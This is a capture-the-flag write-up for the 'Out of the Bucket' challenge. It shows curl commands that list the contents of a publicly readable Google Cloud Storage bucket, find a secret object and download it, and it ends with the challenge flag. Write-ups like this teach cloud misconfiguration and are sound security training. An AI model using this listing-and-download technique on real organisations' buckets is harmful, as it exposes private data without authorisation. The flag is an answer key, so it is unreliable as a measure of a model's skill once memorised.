# Out of the Bucket [506 Solves]

## Description

> Check out my flag website!
>
> Author: windex
>
> `https://storage.googleapis.com/out-of-the-bucket/src/index.html`

## Short Solution

Directory listing in bucket of Cloud Storage

## Solution

Directory listing in <https://storage.googleapis.com/out-of-the-bucket/> URL.
I found /secret/dont_show interesting object so download it.

```console
$ curl -s https://storage.googleapis.com/out-of-the-bucket/ | xq -x
<ListBucketResult xmlns="http://doc.s3.amazonaws.com/2006-03-01">
  <Name>out-of-the-bucket</Name>
  <Prefix></Prefix>
  <Marker></Marker>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>secret/</Key>
    <Generation>1703868492595821</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:48:12.634Z</LastModified>
    <ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>
    <Size>0</Size>
  </Contents>
  <Contents>
    <Key>secret/dont_show</Key>
    <Generation>1703868647771911</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:50:47.809Z</LastModified>
    <ETag>"737eb19c7265186a2fab89b5c9757049"</ETag>
    <Size>29</Size>
  </Contents>
  <Contents>
    <Key>secret/funny.json</Key>
    <Generation>1705174300570372</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2024-01-13T19:31:40.607Z</LastModified>
    <ETag>"d1987ade72e435073728c0b6947a7aee"</ETag>
    <Size>2369</Size>
  </Contents>
  <Contents>
    <Key>src/</Key>
    <Generation>1703867253127898</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:27:33.166Z</LastModified>
    <ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>
    <Size>0</Size>
  </Contents>
  <Contents>
    <Key>src/index.html</Key>
    <Generation>1703867956175503</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:39:16.214Z</LastModified>
    <ETag>"dc63d7225477ead6f340f3057263643f"</ETag>
    <Size>1134</Size>
  </Contents>
  <Contents>
    <Key>src/static/antwerp.jpg</Key>
    <Generation>1703867372975107</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:29:33.022Z</LastModified>
    <ETag>"cef4e40eacdf7616f046cc44cc55affc"</ETag>
    <Size>45443</Size>
  </Contents>
  <Contents>
    <Key>src/static/guam.jpg</Key>
    <Generation>1703867372954729</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:29:32.993Z</LastModified>
    <ETag>"f6350c93168c2955ceee030ca01b8edd"</ETag>
    <Size>48805</Size>
  </Contents>
  <Contents>
    <Key>src/static/style.css</Key>
    <Generation>1703867372917610</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2023-12-29T16:29:32.972Z</LastModified>
    <ETag>"0c12d00cc93c2b64eb4cccb3d36df8fd"</ETag>
    <Size>76559</Size>
  </Contents>
</ListBucketResult>

$ curl -s https://storage.googleapis.com/out-of-the-bucket/secret/dont_show
uoftctf{allUsers_is_not_safe} 
```

## Flag

uoftctf{allUsers_is_not_safe} 
